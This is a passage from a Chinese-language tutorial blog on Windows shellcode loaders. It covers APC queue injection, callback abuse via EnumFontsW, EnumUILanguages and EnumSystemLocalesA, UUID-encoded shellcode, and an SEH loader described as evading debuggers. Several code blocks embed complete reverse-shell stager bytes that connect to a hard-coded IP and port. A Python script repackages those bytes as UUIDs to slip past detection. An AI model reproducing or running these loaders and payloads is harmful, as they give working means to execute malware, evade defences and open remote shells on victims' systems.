class="string">&quot;\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b&quot;</span></span><br><span class="line"><span class="string">&quot;\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e&quot;</span></span><br><span class="line"><span class="string">&quot;\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x53\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ApcLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 修改 shellcode 所在内存区域的保护属性，允许执行</span></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)shellcode, <span class="built_in">sizeof</span>(shellcode), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    获取NtTestAlert函数地址, 因为它是一个内部函数.无法直接通过函数名调用</span></span><br><span class="line"><span class="comment">    这个函数用于检查当前线程的 APC（Asynchronous Procedure Call，异步过程调用）队列，如</span></span><br><span class="line"><span class="comment">    果队列中有挂起的用户模式 APC 请求，NtTestAlert 将触发它们的执行</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    pNtTestAlert NtTestAlert = (pNtTestAlert)(<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll&quot;</span>), <span class="string">&quot;NtTestAlert&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向当前线程的异步过程调用(APC)队列添加一个执行shellcode的任务</span></span><br><span class="line">    <span class="built_in">QueueUserAPC</span>((PAPCFUNC)(PTHREAD_START_ROUTINE)(LPVOID)shellcode, <span class="built_in">GetCurrentThread</span>(), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用NtTestAlert，触发 APC 队列中的任务执行（即执行 shellcode）</span></span><br><span class="line">    <span class="built_in">NtTestAlert</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">ApcLoader</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="7-基于回调函数"><a href="#7-基于回调函数" class="headerlink" title="7.基于回调函数"></a>7.基于回调函数</h1><h2 id="EnumFontsW"><a href="#EnumFontsW" class="headerlink" title="EnumFontsW"></a>EnumFontsW</h2><p>这段代码的关键在于它使用 <code>EnumFontsW</code> 函数的回调机制来执行 shellcode。当 <code>EnumFontsW</code> 函数遍历到一个字体时，它将调用 shellcode 作为回调函数来处理字体信息。由于回调函数直接指向 shellcode，这样可以间接地加载并执行 shellcode</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CallBack</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* p = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(p, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * EnumFontsW是Windows API，用于枚举系统中所有可用字体</span></span><br><span class="line"><span class="comment">    * 参数1：设备环境句柄，表示要枚举哪个设备的字体</span></span><br><span class="line"><span class="comment">    * 参数2：NULL表示枚举所有字体</span></span><br><span class="line"><span class="comment">    * 参数3：回调函数指针，用于处理每个枚举到的字体信息</span></span><br><span class="line"><span class="comment">    * 参数4：回调函数参数</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">EnumFontsW</span>(<span class="built_in">GetDC</span>(<span class="literal">NULL</span>), <span class="literal">NULL</span>, (FONTENUMPROCW)p, <span class="literal">NULL</span>); <span class="comment">//回调函数</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">CallBack</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="EnumUILanguages"><a href="#EnumUILanguages" class="headerlink" title="EnumUILanguages"></a>EnumUILanguages</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CallBack</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* p = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(p, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    EnumUILanguages 函数是在 Windows 操作系统中使用的一个函数，它用于列举安装在系统上的用户界面语言（UI language）</span></span><br><span class="line"><span class="comment">    参数1:指向回调函数的指针,这个回调函数将在每个列举到的用户界面语言上被调用</span></span><br><span class="line"><span class="comment">    参数2:指定列举语言时的选项和标志</span></span><br><span class="line"><span class="comment">    参数3:应用程序定义的一个参数，它将传递给回调函数</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">EnumUILanguages</span>((UILANGUAGE_ENUMPROC)p, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">CallBack</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h1 id="8-基于uuid"><a href="#8-基于uuid" class="headerlink" title="8.基于uuid"></a>8.基于uuid</h1><h2 id="什么是UUID"><a href="#什么是UUID" class="headerlink" title="什么是UUID"></a>什么是UUID</h2><p>UUID（Universally Unique Identifier，通用唯一识别码）是一种为计算机系统中的所有对象分配一个唯一标识符的软件构建块。UUID 是 128 位的数字，通常由 32 个十六进制(16个字节)数字表示，并由连字符分隔成五个部分，形式为 8-4-4-4-12。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">550e8400-e29b-41d4-a716-446655440000</span><br></pre></td></tr></table></figure>

<p>UUID 的目的是在没有中央协调机构的情况下，能够在分布式系统中生成唯一标识符。这意味着，任何人在任何地方都可以创建一个 UUID，而无需担心与其他人创建的 UUID 冲突。UUID 的设计使得它们的全局唯一性非常高，即使在不同的计算机系统和网络中也能保持唯一性。</p>
<p>UUID 通常用于以下场景：</p>
<ul>
<li>数据库中的主键：用 UUID 作为数据库表的主键，确保每个记录都具有唯一的标识符，避免数据冲突。</li>
<li>分布式系统中的对象标识符：在分布式系统中，由于系统组件可能位于不同的计算机或网络上，使用 UUID 作为对象的唯一标识符有助于确保唯一性。</li>
<li>会话标识符：在网络应用中，使用 UUID 作为会话标识符可以确保每个会话都有唯一的识别码。</li>
<li>临时文件名：当需要创建临时文件时，使用 UUID 作为文件名可以确保不会与现有文件冲突。</li>
</ul>
<h2 id="什么是GUID"><a href="#什么是GUID" class="headerlink" title="什么是GUID"></a>什么是GUID</h2><p>GUID（Globally Unique Identifier，全局唯一标识符）是一个 128 位长的数字，用于在软件中为对象分配唯一的标识符。GUID 和 UUID（Universally Unique Identifier）基本上是相同的概念，只是术语上的差别。实际上，GUID 是 UUID 的一种实现。</p>
<p>GUID 通常表示为 32 个十六进制数字，分为五组，用连字符分隔，形式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">550e8400-e29b-41d4-a716-446655440000</span><br></pre></td></tr></table></figure>



<h2 id="shellcode转uuid"><a href="#shellcode转uuid" class="headerlink" title="shellcode转uuid"></a>shellcode转uuid</h2><p>这段代码首先将包含 shellcode 的字节数组进行处理，确保长度是 16 的倍数。然后，将 shellcode 分为 16 字节的块，并为每个块创建一个 UUID，将这些 UUID 存储在一个列表中。最后，将这些 UUID 以 C 语言数组的形式输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用cs或msf生成的python类型的shellcode</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x30\x89\xe5\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x8b\x48&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x18\x01\xd3\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x2f&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x9b\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x56\x6a\x00\x53\xff\xd5&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于存放shellcode转换成的uuid</span></span><br><span class="line">uuid_list = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保 shellcode 长度是 16 的倍数，用 NOPs (\x90) 进行填充</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(shellcode) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">    shellcode += <span class="string">b&#x27;\x90&#x27;</span> * (<span class="number">16</span> - <span class="built_in">len</span>(shellcode) % <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每16字节为一组，遍历 shellcode</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">16</span>):</span><br><span class="line">    chunk = shellcode[i:i + <span class="number">16</span>]</span><br><span class="line">    <span class="comment"># 为每组创建一个 UUID（GUID）</span></span><br><span class="line">    uuid_chunk = uuid.UUID(bytes_le=chunk)</span><br><span class="line">    uuid_list.append(<span class="built_in">str</span>(uuid_chunk))</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出uuid的c语言数组形式</span></span><br><span class="line">uuids = <span class="string">&quot;const char* uuids[] = &#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> uuid <span class="keyword">in</span> uuid_list:</span><br><span class="line">    uuids = uuids + <span class="string">f&quot;\&quot;<span class="subst">&#123;uuid&#125;</span>\&quot;,&quot;</span></span><br><span class="line">uuids = uuids[:-<span class="number">1</span>] + <span class="string">&quot;&#125;;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(uuids)</span><br></pre></td></tr></table></figure>



<h2 id="uuid写入shellcode"><a href="#uuid写入shellcode" class="headerlink" title="uuid写入shellcode"></a>uuid写入shellcode</h2><p>以下代码的主要目的是通过UUID加载并执行shellcode。代码的关键步骤如下：</p>
<ol>
<li>定义一个包含转换为UUID形式的shellcode字符串数组<code>uuids</code>。</li>
<li>创建一个具有执行权限的堆<code>hc</code>。</li>
<li>在堆上分配一块可执行内存<code>buffer</code>。</li>
<li>检查内存分配是否成功，如果失败则输出错误信息并返回。</li>
<li>将UUID值转换回原始的shellcode并将其存储在<code>buffer_backup</code>地址。</li>
<li>使用<code>EnumSystemLocalesA</code>函数调用转换回的shellcode。这是通过将shellcode作为处理每个枚举到的区域设置信息的回调函数的地址传递给<code>EnumSystemLocalesA</code>函数实现的。</li>
<li>关闭内存句柄。</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Rpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Rpcrt4.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//用于存放shellcode转的uuid的数组</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* uuids[] = &#123; <span class="string">&quot;008fe8fc-0000-3160-d264-8b523089e58b&quot;</span>,<span class="string">&quot;528b0c52-8b14-2872-0fb7-4a2631ff31c0&quot;</span>,<span class="string">&quot;7c613cac-2c02-c120-cf0d-01c74975ef52&quot;</span>,<span class="string">&quot;10528b57-428b-013c-d08b-407885c0744c&quot;</span>,<span class="string">&quot;8b50d001-2058-488b-1801-d385c9743c31&quot;</span>,<span class="string">&quot;348b49ff-018b-31d6-c0c1-cf0dac01c738&quot;</span>,<span class="string">&quot;03f475e0-f87d-7d3b-2475-e0588b582401&quot;</span>,<span class="string">&quot;0c8b66d3-8b4b-1c58-01d3-8b048b01d089&quot;</span>,<span class="string">&quot;5b242444-615b-5a59-51ff-e0585f5a8b12&quot;</span>,<span class="string">&quot;ffff80e9-5dff-3368-3200-00687773325f&quot;</span>,<span class="string">&quot;774c6854-0726-e889-ffd0-b89001000029&quot;</span>,<span class="string">&quot;685054c4-8029-006b-ffd5-6a0a68c0a82f&quot;</span>,<span class="string">&quot;0002689b-5c11-e689-5050-505040504050&quot;</span>,<span class="string">&quot;df0fea68-ffe0-97d5-6a10-56576899a574&quot;</span>,<span class="string">&quot;85d5ff61-74c0-ff0a-4e08-75ece8670000&quot;</span>,<span class="string">&quot;6a006a00-5604-6857-02d9-c85fffd583f8&quot;</span>,<span class="string">&quot;8b367e00-6a36-6840-0010-0000566a0068&quot;</span>,<span class="string">&quot;e553a458-d5ff-5393-6a00-5653576802d9&quot;</span>,<span class="string">&quot;d5ff5fc8-f883-7d00-2858-68004000006a&quot;</span>,<span class="string">&quot;0b685000-0f2f-ff30-d557-68756e4d61ff&quot;</span>,<span class="string">&quot;ff5e5ed5-240c-850f-70ff-ffffe99bffff&quot;</span>,<span class="string">&quot;29c301ff-75c6-c3c1-bbf0-b5a2566a0053&quot;</span>,<span class="string">&quot;9090d5ff-9090-9090-9090-909090909090&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">UuidLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建一个具有执行权限的堆</span></span><br><span class="line">    HANDLE hc = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在堆上分配一块可执行内存</span></span><br><span class="line">    <span class="type">void</span>* buffer = <span class="built_in">HeapAlloc</span>(hc, <span class="number">0</span>, <span class="number">0x100000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查内存分配是否成功，如果失败则输出错误信息并返回0</span></span><br><span class="line">    <span class="keyword">if</span> (buffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;内存申请失败！&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    PBYTE buffer_backup = (PBYTE)buffer;  <span class="comment">//定义一个存储uuid转换成的二进制字节序列(shellcode)</span></span><br><span class="line">    <span class="type">int</span> elems = <span class="built_in">sizeof</span>(uuids) / <span class="built_in">sizeof</span>(uuids[<span class="number">0</span>]);  <span class="comment">//获取uuid数组元素的个数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    UuidFromStringA函数将UUID值转换成二进制字节序列,其语法格式如下:</span></span><br><span class="line"><span class="comment">    RPC_STATUS UuidFromStringA(</span></span><br><span class="line"><span class="comment">        RPC_CSTR StringUuid,  //指向uuid形式的字符串的指针</span></span><br><span class="line"><span class="comment">        UUID * Uuid  //用于接收二进制字节序列的指针</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 遍历uuids数组,并将UUID转换回原始的shellcode,然后存储在buffer_backup地址</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; elems; i++) &#123;</span><br><span class="line">        RPC_STATUS status = <span class="built_in">UuidFromStringA</span>((RPC_CSTR)uuids[i], (UUID*)buffer_backup);</span><br><span class="line">        <span class="keyword">if</span> (status != RPC_S_OK) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;UuidFromStringA() != S_OK&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="built_in">CloseHandle</span>(buffer);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        buffer_backup += <span class="number">16</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">   EnumSystemLocalesA函数用于枚举系统中支持的所有区域设置,其语法格式如下:</span></span><br><span class="line"><span class="comment">   BOOL EnumSystemLocalesA(</span></span><br><span class="line"><span class="comment">     LOCALE_ENUMPROCA lpLocaleEnumProc,  //处理每个枚举到的区域设置信息的回调函数的地址</span></span><br><span class="line"><span class="comment">     DWORD            dwFlags  //指定枚举的方式</span></span><br><span class="line"><span class="comment">   );</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    <span class="comment">// 使用 EnumSystemLocalesA 函数调用转换回的 shellcode</span></span><br><span class="line">    <span class="built_in">EnumSystemLocalesA</span>((LOCALE_ENUMPROCA)buffer, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭内存句柄</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 调用 UuidLoader 函数</span></span><br><span class="line">    <span class="built_in">UuidLoader</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="9-基于SEH异常处理"><a href="#9-基于SEH异常处理" class="headerlink" title="9.基于SEH异常处理"></a>9.基于SEH异常处理</h1><h2 id="什么是SEH"><a href="#什么是SEH" class="headerlink" title="什么是SEH"></a>什么是SEH</h2><p>SEH（Structured Exception Handling，结构化异常处理）是Windows操作系统中的一种错误处理和异常处理机制。SEH提供了一种强大、灵活且通用的方法来处理异常，它使得开发者能够为应用程序中发生的运行时错误和异常编写自定义的处理代码</p>
<p>SEH的工作原理是在程序中建立一个异常处理函数链。每个异常处理函数都负责处理特定的异常。当程序运行时遇到异常，操作系统会沿着异常处理函数链寻找适当的处理函数。如果找到合适的异常处理函数，系统将调用该函数并处理异常。如果没有找到合适的处理函数，系统将终止程序</p>
<p><img src="/shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/assets/-M3GuIlaAXU8NbJTCRei/-M7u7TrzN0Wym0qmjjSg/-M7u9bFpgHXC3vjN9d5g/image.png" alt="img"></p>
<p>在C++中，可以使用<code>_try</code>、<code>_except</code>和<code>_finally</code>关键字来实现SEH异常处理。<code>_try</code>块包含可能引发异常的代码；<code>_except</code>块包含处理异常的代码；而<code>_finally</code>块包含在任何情况下都应执行的代码，无论是否发生异常	</p>
<p>SEH的一个重要特点是它与语言无关，因此可以在C、C++等语言中使用。然而，C++提供了另一种异常处理机制：C++异常处理（<code>try</code>、<code>catch</code>和<code>throw</code>关键字）。C++异常处理机制更符合C++语言的面向对象特性，通常在C++程序中更为常用。然而，在某些情况下，SEH仍然具有独特的优势，例如在处理特定的Windows异常或与C代码交互时</p>
<h2 id="实现代码-2"><a href="#实现代码-2" class="headerlink" title="实现代码"></a>实现代码</h2><p>这种方式加载shellcode的一个好处就是在调试器环境下和正常运行环境下表现不同。当程序在调试器中运行时，调试器会接管异常处理，从而使得程序在除零异常处停止，而不会执行shellcode。这使得恶意代码的执行在调试环境下被阻止，为分析和调试带来困难</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 存储要执行的shellcode</span></span><br><span class="line"><span class="type">char</span> shellcode[] = </span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x31\xff\x0f\xb7&quot;</span></span><br><span class="line"><span class="string">&quot;\x4a\x26\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x20\x01\xd3\x50\x85\xc9\x74\x3c\x49\x31\xff\x8b\x34&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80&quot;</span></span><br><span class="line"><span class="string">&quot;\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x2f\x9b\x68\x02\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74&quot;</span></span><br><span class="line"><span class="string">&quot;\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b&quot;</span></span><br><span class="line"><span class="string">&quot;\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e&quot;</span></span><br><span class="line"><span class="string">&quot;\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x53\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义异常处理函数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ExceptFilter</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	b = <span class="number">1</span>; <span class="comment">// 修改b的值为1，以防止无限循环的异常处理</span></span><br><span class="line">	((<span class="built_in">void</span>(*)(<span class="type">void</span>)) &amp; shellcode)(); <span class="comment">// 强制转换shellcode的类型，并执行</span></span><br><span 